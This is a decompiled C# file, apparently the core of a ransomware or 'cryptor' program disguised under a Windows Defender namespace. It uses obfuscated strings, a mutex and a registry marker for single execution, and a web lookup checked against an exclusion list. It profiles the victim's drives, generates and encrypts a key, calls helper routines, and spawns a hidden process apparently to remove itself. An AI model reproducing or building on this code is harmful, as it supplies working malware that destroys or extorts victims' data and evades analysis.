using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Windows_Defender.Cryptor;

internal static class Class4
{
	internal static readonly string[] string_0 = new string[10]
	{
		Class8.smethod_1(-2084958536),
		Class8.smethod_1(-2084958591),
		Class8.smethod_1(-2084958582),
		Class8.smethod_1(-2084958573),
		Class8.smethod_1(-2084958876),
		Class8.smethod_1(-2084958867),
		Class8.smethod_1(-2084958858),
		Class8.smethod_1(-2084958849),
		Class8.smethod_1(-2084958912),
		Class8.smethod_1(-2084958903)
	};

	[STAThread]
	public static bool smethod_0()
	{
		if (Registry.GetValue(Class8.smethod_1(-2084958894), Class8.smethod_1(-2084958961), null) == null)
		{
			Registry.SetValue(Class8.smethod_1(-2084958894), Class8.smethod_1(-2084958961), Class8.smethod_1(-2084958947));
			return false;
		}
		return true;
	}

	public static string smethod_1()
	{
		WebClient webClient = new WebClient();
		try
		{
			return Regex.Split(webClient.DownloadString(Class8.smethod_1(-2084958752)), Class8.smethod_1(-2084958781))[1].Split(new char[1] { '"' })[0];
		}
		catch (Exception)
		{
			return Class8.smethod_1(-2084958767);
		}
	}

	public static bool smethod_2(string string_1)
	{
		if (string_1 != null)
		{
			string[] array = string_0;
			foreach (string text in array)
			{
				if (string_1 == text)
				{
					return true;
				}
			}
		}
		return false;
	}

	private static void Main()
	{
		FileInfo fileInfo = new FileInfo(Application.get_ExecutablePath());
		string text = smethod_1();
		new Mutex(initiallyOwned: true, Class8.smethod_1(-2084958758), out var createdNew);
		if (createdNew && !(fileInfo.Name.ToLower() != Class8.smethod_1(-2084958836)) && !smethod_0() && !smethod_2(text))
		{
			string string_ = Tools.smethod_3(0) + Class8.smethod_1(-2084958544) + text + Class8.smethod_1(-2084958544) + Environment.GetLogicalDrives().Length + Class8.smethod_1(-2084958544) + smethod_3().ToString() + Class8.smethod_1(-2084958819);
			string string_2 = Tools.smethod_4(0, 1, Class8.smethod_1(-2084959129));
			string string_3 = Class2.smethod_4(string_, string_2);
			Class1.smethod_0(string_, string_3);
			Tools.smethod_1();
		}
		else
		{
			Environment.Exit(-1);
		}
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = Class8.smethod_1(-2084959662) + Application.get_ExecutablePath();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = Class8.smethod_1(-2084952111);
		try
		{
			Process.Start(processStartInfo);
		}
		catch (Exception)
		{
		}
		Environment.Exit(0);
	}

	private static long smethod_3()
	{
		long num = 0L;
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady && driveInfo.DriveType != DriveType.CDRom)
				{
					num += (driveInfo.TotalSize - driveInfo.TotalFreeSpace) / 1000000000L;
				}
			}
			return num;
		}
		catch (Exception)
		{
		}
		return 0L;
	}
}
